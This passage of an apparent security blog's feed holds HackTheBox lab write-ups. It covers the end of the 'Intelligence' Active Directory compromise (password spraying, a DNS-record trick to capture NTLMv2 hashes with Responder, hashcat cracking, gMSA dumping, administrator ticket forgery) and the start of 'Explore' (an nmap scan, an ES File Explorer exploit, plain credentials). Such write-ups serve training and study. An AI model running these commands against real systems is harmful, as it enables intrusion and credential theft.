+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pdfminer.pdfinterp &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; PDFResourceManager
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pdfminer.layout &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; LAParams
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pdfminer.converter &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; TextConverter
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pdfminer.pdfinterp &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; PDFPageInterpreter
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pdfminer.pdfpage &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; PDFPage
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pdf_to_text&lt;/span&gt;(path):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; fp:
+        rsrcmgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PDFResourceManager()
+        outfp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;StringIO()
+        laparams &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LAParams()
+        device &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; TextConverter(rsrcmgr, outfp, laparams&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;laparams)
+        interpreter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PDFPageInterpreter(rsrcmgr, device)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; page &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; PDFPage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_pages(fp):
+            interpreter&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process_page(page)
+    text &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; outfp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getvalue()
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; text
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
+    outfile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;combinedContent.txt&amp;#39;&lt;/span&gt;
+    content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; fname &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:]:
+        content &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; pdf_to_text(fname)
+    &lt;span style=&#34;color:#75715e&#34;&gt;# save to outfile&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(outfile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
+        f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(content)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There is a PDF with new account default password (06-04):&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;NewIntelligenceCorpUser9876
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Searching for common words (like &amp;lsquo;the&amp;rsquo;), I found another interesting piece of text:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Internal IT Update
+
+There has recently been some outages on our [web servers]. [Ted] has gotten a
+[script] in place to help notify us if this happens again.
+Also, after discussion following our recent security audit we are in the process
+of locking down our [service accounts].
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5- From PDFs, extract the potential usernames: scrapeUsers.py. The unique names are at userlist.txt. What I can do is to strip the lastname, toggle capital letters, change dot to underscore.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys 
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; exiftool
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
+    files &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:]
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; exiftool&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ExifTool() &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; et:
+        metadata &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; et&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_metadata_batch(files)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; metadata:
+        print(d[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PDF:Creator&amp;#39;&lt;/span&gt;])
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;6- Password spraying with default password:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;crackmapexec smb intelligence.htb -u userlist.txt -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NewIntelligenceCorpUser9876&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
+
+Tiffany.Molina:NewIntelligenceCorpUser9876
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;7- SMB server via smbclient:
+Sharename       Type Comment                          │
+&amp;mdash;&amp;mdash;&amp;mdash;       &amp;mdash;-      &amp;mdash;&amp;mdash;-                          │
+ADMIN$          Disk      Remote Admin                     │
+C$              Disk      Default  share                    │
+IPC$            IPC       Remote IPC                       │
+IT              Disk                                       │
+NETLOGON        Disk      Logon server share               │
+SYSVOL          Disk      Logon server share               │
+Users           Disk&lt;/p&gt;
+&lt;p&gt;Tiffany cannot access C$, ADMIN$.
+From Users folder, we can see there is another user named Ted.Graves, who doesn&amp;rsquo;t have the default password.
+In IT folder, there is a downdetector.ps1 script.&lt;/p&gt;
+&lt;p&gt;9- Use crackmapexec to retrieve hashes from memory using &amp;ndash;sam. No success.&lt;/p&gt;
+&lt;p&gt;10- Enumerate all services in AD by ldapsearch, this time with credentials: ldapsearch -h intelligence.htb -x -D &amp;ldquo;cn=Tiffany.Molina,cn=Users,dc=intelligence,dc=htb&amp;rdquo; -w NewIntelligenceCorpUser9876 servicePrincipalName.
+No success, invalid credentials.&lt;/p&gt;
+&lt;p&gt;11- Read downdetector.ps1. It is the script that the Internal IT document mentioned. It is scheduled to run every 5 minutes. If there is a domain starting with &amp;lsquo;web&amp;rsquo;, send a request with &lt;strong&gt;default credentials&lt;/strong&gt;, probably from Ted. Let&amp;rsquo;s trigger it by adding a DNS record starting with &amp;lsquo;web&amp;rsquo; and catch the default credentials of Ted.&lt;/p&gt;
+&lt;p&gt;This is downdetector.ps1.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Check web server status. Scheduled to run every 5min&lt;/span&gt;
+Import-Module ActiveDirectory 
+&lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt;($record &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; Get-ChildItem &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&amp;#34;&lt;/span&gt; | Where-Object Name &lt;span style=&#34;color:#f92672&#34;&gt;-like&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;web*&amp;#34;&lt;/span&gt;)  {
+&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+$request = Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&lt;/span&gt;$($record.Name)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -UseDefaultCredentials
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(.StatusCode &lt;span style=&#34;color:#f92672&#34;&gt;-ne&lt;/span&gt; 200) {
+Send-MailMessage -From &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Ted Graves &amp;lt;Ted.Graves@intelligence.htb&amp;gt;&amp;#39;&lt;/span&gt; -To &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Ted Graves &amp;lt;Ted.Graves@intelligence.htb&amp;gt;&amp;#39;&lt;/span&gt; -Subject &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &lt;/span&gt;$($record.Name)&lt;span style=&#34;color:#e6db74&#34;&gt; is down&amp;#34;&lt;/span&gt;
+}
+} &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; {}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And here we add a DNS record with Tiffany credentials.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 dnstool.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;intelligence.htb\Tiffany.Molina&amp;#39;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NewIntelligenceCorpUser9876&amp;#39;&lt;/span&gt; -a add -r &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;weboops.intelligence.htb&amp;#39;&lt;/span&gt; -d 10.10.14.93 10.10.10.248 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;where 10.10.10.248 is the IP of the LDAP server&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Listen for NTLM connection.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;responder -I tun0 -A
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;HTTP&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; NTLMv2 Client   : 10.10.10.248
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;HTTP&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; NTLMv2 Username : intelligence&lt;span style=&#34;color:#ae81ff&#34;&gt;\T&lt;/span&gt;ed.Graves
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;HTTP&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; NTLMv2 Hash     : Ted.Graves::intelligence:cb633911f6b526fe:79E28A59A0F79CEE88340066FF707585:01010000000000002828DFB4C796D7018D1F70D25A187CCC0000000002000800360033003400590001001E00570049004E002D00470054004A004D004D0041004B0037004100370035000400140036003300340059002E004C004F00430041004C0003003400570049004E002D00470054004A004D004D0041004B0037004100370035002E0036003300340059002E004C004F00430041004C000500140036003300340059002E004C004F00430041004C00080030003000000000000000000000000020000029AFE7F9B78F25FB6B044D77DB5B680EAD8D7FBD6B72AE9E6CE76020298CB43C0A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;12- Sadly we cannot convert NTLMv2 hash to NTLM hash to perform PtH attacks. What we can do is either NTLM relay or crack the hash.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ntlmrelayx &lt;span style=&#34;color:#75715e&#34;&gt;# Haven&amp;#39;t read about ntlm relay internals. I need to study it. &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;5600&lt;/span&gt; ted_ntlmv2.txt /usr/share/wordlists/rockyou.txt -O &lt;span style=&#34;color:#75715e&#34;&gt;# --&amp;gt; Mr.Teddy&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Where ted_ntlmv2.txt is&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Ted.Graves::intelligence:cb633911f6b526fe:79E28A59A0F79CEE88340066FF707585:01010000000000002828DFB4C796D7018D1F70D25A187CCC0000000002000800360033003400590001001E00570049004E002D00470054004A004D004D0041004B0037004100370035000400140036003300340059002E004C004F00430041004C0003003400570049004E002D00470054004A004D004D0041004B0037004100370035002E0036003300340059002E004C004F00430041004C000500140036003300340059002E004C004F00430041004C00080030003000000000000000000000000020000029AFE7F9B78F25FB6B044D77DB5B680EAD8D7FBD6B72AE9E6CE76020298CB43C0A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;13- Run bloodhound via winrm. WinRMAuthorizationError for both Ted and Tiffany. Try psexec.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;evil-winrm -e htb/machines/intelligence/privesc -i intelligence.htb -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Tiffany.Molina&amp;#39;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NewIntelligenceCorpUser9876&amp;#39;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;psexec.py intelligence.htb/Ted.Graves@dc.intelligence.htb &lt;span style=&#34;color:#75715e&#34;&gt;# Shares aren&amp;#39;t writable by Ted. &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;14- Use Ted and Tiffany creds to gMSADumper and lapsdumper in search for hashes. lapsdumper does not reveal anything (no permissions).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 gMSADumper.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Tiffany.Molina&amp;#39;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;NewIntelligenceCorpUser9876&amp;#39;&lt;/span&gt; -d intelligence.htb
+python3 gMSADumper.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Ted.Graves&amp;#39;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Mr.Teddy&amp;#39;&lt;/span&gt; -d intelligence.htb
+
+&amp;gt; DC$
+&amp;gt; itsupport
+svc_int$:::5e47bac787e5e1970cf9acdb5b316239
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;15- Try to get the service ticket and perform Pass The Ticket (PTT) attack.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 getST.py intelligence.htb/scv_int$ -spn WWW/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Getting TGT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; user
+Kerberos SessionError: KRB_AP_ERR_SKEW&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Clock skew too great&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it&amp;rsquo;s because of your local time, you need to synchronise the host with the DC: &lt;code&gt;ntpdate &amp;lt;IP of DC&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ntpdate intelligence.htb
+python3 getST.py intelligence.htb/scv_int$ -spn WWW/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;16- Load the ccache ticket by setting the KRB5CCNAME environment variable to the ticket path. Then access SMB using the ticket.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;export KRB5CCNAME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/path/to/administrator.ccache
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient.py -k -no-pass -dc-ip intelligence.htb -target-ip intelligence.htb intelligence.htb/Administrator@dc.intelligence.htb
+
+&amp;gt; use C$
+&amp;gt; cd Users/Administrator/Desktop
+&amp;gt; get root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OR mount C$??? But failed with STATUS_SHARING_VIOLATION.
+OR psexec.py&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;psexec.py -k -no-pass &lt;a href=&#34;mailto:intelligence.htb/Administrator@dc.intelligence.htb&#34;&gt;intelligence.htb/Administrator@dc.intelligence.htb&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;root: 676a7f4d669819b40d5d8ef5aadb6f5c&lt;/p&gt;
+
+  &lt;/div&gt;
+&lt;/div&gt;
+
+</content>
+    </item>
+    
+    <item>
+      <title>Explore - HackTheBox machine</title>
+      <link>/labs/explore/</link>
+      <pubDate>Tue, 07 Sep 2021 13:19:14 +0200</pubDate>
+      
+      <guid>/labs/explore/</guid>
+      <description>Rank: easy  Foothold 1- Nmap for all ports.
+# Nmap 7.91 scan initiated Tue Jul 20 07:48:06 2021 as: nmap -sC -sV -p- -oA nmap target Nmap scan report for target (10.10.10.247) Host is up (0.061s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 38595/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;p&gt;1- Nmap for all ports.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Tue Jul 20 07:48:06 2021 as: nmap -sC -sV -p- -oA nmap target
+Nmap scan report for target (10.10.10.247)
+Host is up (0.061s latency).
+Not shown: 65530 closed ports
+PORT      STATE    SERVICE VERSION
+2222/tcp  open     ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey: 
+|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+5555/tcp  filtered freeciv
+38595/tcp open     unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Tue, 20 Jul 2021 12:44:55 GMT
+|     Content-Length: 22
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|   GetRequest: 
+|     HTTP/1.1 412 Precondition Failed
+|     Date: Tue, 20 Jul 2021 12:44:55 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 501 Not Implemented
+|     Date: Tue, 20 Jul 2021 12:45:00 GMT
+|     Content-Length: 29
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Method not supported: OPTIONS
+|   Help: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Tue, 20 Jul 2021 12:45:16 GMT
+|     Content-Length: 26
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: HELP
+|   RTSPRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Tue, 20 Jul 2021 12:45:00 GMT
+|     Content-Length: 39
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     valid protocol version: RTSP/1.0
+|   SSLSessionReq: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Tue, 20 Jul 2021 12:45:16 GMT
+|     Content-Length: 73
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ?G???,???`~?
+|     ??{????w????&amp;lt;=?o?
+|   TLSSessionReq: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Tue, 20 Jul 2021 12:45:16 GMT
+|     Content-Length: 71
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ??random1random2random3random4
+|   TerminalServerCookie: 
+|     HTTP/1.0 400 Bad Request
+|     Date: Tue, 20 Jul 2021 12:45:16 GMT
+|     Content-Length: 54
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|_    Cookie: mstshash=nmap
+42135/tcp open     http    ES File Explorer Name Response httpd
+|_http-title: Site doesn&#39;t have a title (text/html).
+59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+|_http-title: Site doesn&#39;t have a title (text/plain).
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2- ES File explorer metasploit exploit auxiliary/scanner/http/es_file&amp;hellip; to get pictures and look for creds.&lt;/p&gt;
+&lt;p&gt;3- The creds in creds.jpg is probably the creds for ssh tcp/2222.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;   username: kristi
+   password: Kr1sT!5h@Rp3xPl0r3!
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege escalation&lt;/h2&gt;
+&lt;p&gt;4- tcp 5555 freeciv exploit.
+Android Debug Bridge freeciv exploit. This is a python script which is basically the solution: ssh local port forwarding: connect to remote 5555 via 2222 ssh link.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket &lt;span style=&#34;color:#75715e&#34;&gt;# socket&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; subprocess  &lt;span style=&#34;color:#75715e&#34;&gt;# Subprocess&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pyautogui  &lt;span style=&#34;color:#75715e&#34;&gt;# PyAutoGui&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time  &lt;span style=&#34;color:#75715e&#34;&gt;# Time&lt;/span&gt;
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connection_function&lt;/span&gt;(host, port):
+  s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+  s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((host, port))
+  print(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;))
+
+connection_function(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10.10.10.247&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2222&lt;/span&gt;)
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;adb_connection&lt;/span&gt;(host, port):
